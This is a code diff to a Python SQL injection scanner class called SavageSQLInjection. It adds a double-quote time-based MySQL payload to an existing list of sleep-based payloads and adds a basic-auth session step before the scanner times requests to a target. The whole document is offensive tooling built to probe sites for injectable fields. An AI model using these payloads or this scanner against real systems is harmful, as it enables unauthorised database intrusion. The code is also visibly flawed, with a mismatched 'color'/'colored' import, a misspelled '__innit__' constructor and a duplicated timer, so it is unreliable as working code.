@@ -1,21 +1,28 @@
 import requests
 import time
 from termcolor import color
+from check_auth_create_session import BasicAuthentication
 
 class SavageSQLInjection(object):
     def __innit__(self, target=None, fields=None, method=None):
         self.payload = [
             {
-                'description' : 'MySQL SELECT time based attack',
+                'description' : 'MySQL SELECT time based attack using single quotes',
                 'payload' : "1' OR 0=sleep(11) LIMIT 1 #",
                 'dbms' : 'mysql',
                 'type' : 'SELECT'
             },
             {
-                'description' : 'MySQL UPDATE time based attack',
+                'description' : 'MySQL UPDATE time based attack using single quotes',
                 'payload' : "1' * sleep(11) * '1",
                 'dbms' : 'mysql',
                 'type' : 'UPDATE'
+            },
+            {
+                'description' : 'MySQL SELECT time based attack using double quotes',
+                'payload' : '1" OR 0=sleep(11) LIMIT 1 #',
+                'dbms' : 'mysql',
+                'type' : 'SELECT'
             }
         ]
         if target:
@@ -33,12 +40,22 @@ class SavageSQLInjection(object):
             self.method = input("Enter method (get/post): ")
     
     def inject(self):
+        print(colored("[i] ", "blue") + "checking for baisc Auth")
+        basic_auth = BasicAuthentication()
+        if basic_auth.check_basic_auth(self.target):
+            print("Uses basic Auth")
+            user = input("input user name: ")
+            password = input("input password: ")
+            s = basic_auth.create_auth_session(user, password)
+        else:
+            s=requests.Session()
+        start = time.time()
         print(colored("[i] ", "blue") + "Getting Baseline")
         start = time.time()
         if self.method == "post":
-            r = requests.post(url=self.target)
+            r = s.post(url=self.target)
         else:
-            r = requests.get(url=self.target)
+            r = s.get(url=self.target)
         end = time.time()
         baseline = end - start
 
@@ -57,12 +74,12 @@ class SavageSQLInjection(object):
                     start = time.time()
                     if self.method == "post":
                         try:
-                            r = requests.post(url=self.target, data=data, timeout =12)
+                            r = s.post(url=self.target, data=data, timeout =12)
                         except:
                             None
                     else:
                         try:
-                            r = requests.get(url=self.target, params=data, timeout = 12)
+                            r = s.get(url=self.target, params=data, timeout = 12)
                         except:
                             None
                     end = time.time()
